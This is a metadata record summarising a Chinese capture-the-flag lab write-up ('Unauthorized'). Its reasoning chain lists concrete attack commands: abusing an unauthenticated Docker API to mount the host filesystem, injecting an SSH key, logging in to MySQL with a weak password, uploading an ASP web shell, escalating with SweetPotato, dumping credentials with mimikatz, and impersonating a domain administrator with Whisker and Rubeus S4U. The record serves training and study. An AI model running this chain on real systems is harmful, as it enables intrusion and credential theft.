...
quality: high
full_path: 春秋云镜——Unauthorized_WriteUp.full.md
meta_path: 春秋云镜——Unauthorized_WriteUp.meta.md
images_removed: true
images_removed_count: 10
schema_version: v3.0.0-P0
summary: 春秋云镜——Unauthorized WriteUp。春秋云镜Unauthorized：Docker 2375未授权+SSH公钥注入+ASP+证书委派Rubeus S4U。经验：Docker daemon 2375未授权+AD CS证书+Whisker/Rubeus是经典域内权限提升组合
category: web
subcategory: logic
time_required: long
difficulty_score: 4
...
contest_type: open
wp_url: https://www.ctfiot.com/69927.html
reasoning_chain:
- 目标 47.92.205.41:2375 → 触发点：Docker daemon 未授权
- 动作：docker -H tcp://47.92.205.41:2375 images → 观察：无认证可访问
- 假设：可挂载宿主机根目录 → 动作：docker run -it -v /:/mnt --entrypoint /bin/bash ubuntu:18.04
- 假设：写 root/.ssh/authorized_keys → 动作：echo ssh-rsa ... > /mnt/root/.ssh/authorized_keys
- 观察：SSH 公钥登录成功 → 动作：mysql -uroot -p123456 → 假设：MySQL 弱口令
- 观察：secret.f1agggg01 表 → flag1
- nmap -sT -A 172.22.7.0/24 → 触发点：172.22.7.67 FTP 匿名 + IIS
- 动作：上传 shell.asp → 假设：IIS 解析 .asp
- SweetPotato.exe -a whoami → 触发点：SeImpersonatePrivilege → 提权 system
- 假设：可导出域凭据 → 动作：mimikatz sekurlsa logonpasswords → 观察：NTLM hash
- Whisker.exe add /target:DC02$ /dc:DC02.xiaorang.lab → 触发点：机器账户证书
- 动作：Rubeus s4u /self /impersonateuser:Administrator /altservice:CIFS/DC02.xiaorang.lab /ptt
failed_attempts:
- 直接 Docker exec 不挂载目录 → 失败：容器内看不到宿主机 flag
- 试图用 mysql UDF → 失败：root 密码直接进数据库读更简单
key_observations:
- Docker 2375 未授权 + -v /:/mnt 挂载宿主机根目录是云上容器经典突破
- Whisker + Rubeus S4U 是 AD CS 机器账户证书攻击标配
- SweetPotato 利用 SeImpersonatePrivilege 提权 system
- IIS + ASP + FTP 匿名上传是 Web 入口到 Windows 系统的捷径
prerequisites:
- Docker daemon API 未授权利用
- SSH 公钥注入
- MySQL 弱口令爆破
- SweetPotato 提权
- Whisker + Rubeus S4U AD CS 攻击
---
